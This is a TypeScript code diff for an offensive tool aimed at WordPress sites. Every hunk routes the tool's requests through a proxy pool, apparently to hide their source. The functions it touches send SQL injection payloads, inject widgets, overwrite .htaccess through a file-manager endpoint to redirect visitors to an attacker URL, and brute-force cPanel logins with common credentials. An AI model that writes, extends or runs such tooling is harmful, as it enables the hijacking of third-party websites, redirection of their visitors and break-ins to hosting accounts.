@@ -12,6 +12,13 @@
 
 import { fetchWithPoolProxy } from "./proxy-pool";
 
+// Helper: wrap fetch with proxy pool for all WP DB injection requests
+async function wpDbFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}): Promise<Response> {
+  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
+  const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: 15000 });
+  return response;
+}
+
 export interface WpDbInjectionConfig {
   targetUrl: string;
   redirectUrl: string;
@@ -102,7 +109,7 @@ async function sendSqliPayload(
     const url = new URL(endpoint);
     url.searchParams.set(param, payload);
 
-    const resp = await fetch(url.toString(), {
+    const resp = await wpDbFetch(url.toString(), {
       headers: {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "text/html,application/xhtml+xml",
@@ -133,7 +140,7 @@ async function sendSqliPayloadPost(
     const formData = new URLSearchParams();
     formData.set(param, payload);
 
-    const resp = await fetch(endpoint, {
+    const resp = await wpDbFetch(endpoint, {
       method: "POST",
       headers: {
         "Content-Type": "application/x-www-form-urlencoded",
@@ -293,7 +300,7 @@ async function injectWpWidgets(config: WpDbInjectionConfig): Promise<WpDbInjecti
 
 async function verifySiteRedirect(targetUrl: string, redirectUrl: string): Promise<boolean> {
   try {
-    const resp = await fetch(targetUrl, {
+    const resp = await wpDbFetch(targetUrl, {
       redirect: "manual",
       headers: { "User-Agent": "Mozilla/5.0" },
       signal: AbortSignal.timeout(10000),
@@ -355,7 +362,7 @@ RewriteRule ^(.*)$ ${config.redirectUrl} [R=302,L]
 
   for (const endpoint of writeEndpoints) {
     try {
-      const checkResp = await fetch(endpoint, {
+      const checkResp = await wpDbFetch(endpoint, {
         method: "HEAD",
         signal: AbortSignal.timeout(5000),
         headers: { "User-Agent": "Mozilla/5.0" },
@@ -371,7 +378,7 @@ RewriteRule ^(.*)$ ${config.redirectUrl} [R=302,L]
           formData.append("target", "l1_Lmh0YWNjZXNz"); // base64 of .htaccess path
           formData.append("name", ".htaccess");
 
-          const writeResp = await fetch(endpoint, {
+          const writeResp = await wpDbFetch(endpoint, {
             method: "POST",
             body: formData as any,
             signal: AbortSignal.timeout(10000),
@@ -427,7 +434,7 @@ async function cpanelTakeover(config: WpDbInjectionConfig): Promise<WpDbInjectio
 
   for (const panelUrl of panelUrls) {
     try {
-      const checkResp = await fetch(panelUrl, {
+      const checkResp = await wpDbFetch(panelUrl, {
         method: "GET",
         redirect: "follow",
         signal: AbortSignal.timeout(5000),
@@ -441,7 +448,7 @@ async function cpanelTakeover(config: WpDbInjectionConfig): Promise<WpDbInjectio
         for (const cred of commonCreds) {
           try {
             const authHeader = "Basic " + Buffer.from(`${cred.user}:${cred.pass}`).toString("base64");
-            const loginResp = await fetch(panelUrl, {
+            const loginResp = await wpDbFetch(panelUrl, {
               headers: {
                 Authorization: authHeader,
                 "User-Agent": "Mozilla/5.0",
